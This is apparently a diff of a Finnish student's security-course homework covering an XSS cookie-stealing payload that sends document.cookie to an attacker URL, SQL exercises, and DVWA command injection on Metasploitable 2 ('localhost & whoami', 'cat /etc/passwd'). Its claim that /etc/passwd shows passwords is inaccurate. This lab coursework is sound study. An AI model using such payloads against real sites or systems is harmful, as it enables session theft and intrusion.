@@ -25,6 +25,11 @@ document.write("<img scr="[URL]?c='+document.cookie+'" />');
 
 *URL kohtaan tulee hakkerin osoite johon lähetetään kaapatut tiedot*
 
+Kohde löytää saman linkin samaan blogi sivustoon, tämän avaamisen jälkeen skripti suoriutuu automaattisestin. Tällöin kohteen istunto menee hakkerin käislle, jonka jälkeen hakkeri saa kohteen istunnon käyttöön
+
+** **
+
+![image](https://user-images.githubusercontent.com/93308960/200964967-8d8ef754-3ccf-405f-bd04-2f2df10651cb.png)
 
 
 ## a) SELECT * FROM student
@@ -147,8 +152,11 @@ WHERE name IN ('france', 'germany', 'italy')
 
 ## b) Darn Low Security
 
+Laitoin Metasploitablen 2 koneen ip-osoitteen selaimeen jolloin avautui alla olevan näköinen sivu, siitä klikkasin DVWA. Kirjauduin admin tunnuksilla.
+
 ![image](https://user-images.githubusercontent.com/93308960/200914056-e74b24eb-37c5-4814-9dde-dcd7e6dbf15e.png)
 
+Vasemmassa sivu palkissa näkyi dvwa security josta pääsin muokkaa `DVWA Security` low
 
 ![image](https://user-images.githubusercontent.com/93308960/200851529-b373dcb9-3921-4561-ab61-8f3396d37b43.png)
 
@@ -156,12 +164,15 @@ WHERE name IN ('france', 'germany', 'italy')
 
 ## c) Execute! 
 
+*en oikein tiiä teinkö tehtävän oikein*
 
-![image](https://user-images.githubusercontent.com/93308960/200914594-c317cda6-b46b-44f7-8980-aa1dcd6c3b1c.png)
+Avasin command execution sivun johon ajoin pari komentoa kuten:
 
+`localhost & whoami` komento teki ping ja kertoi ketä olemme 
 
 ![image](https://user-images.githubusercontent.com/93308960/200914686-f60b8e7a-f3bd-4be4-994c-ba99240f1125.png)
 
+`cat /etc/passwd` komennolla sain salasanat esille.
 
 ![image](https://user-images.githubusercontent.com/93308960/200915095-148fb04d-db8f-4586-a75a-1c3bc5172e6e.png)
 
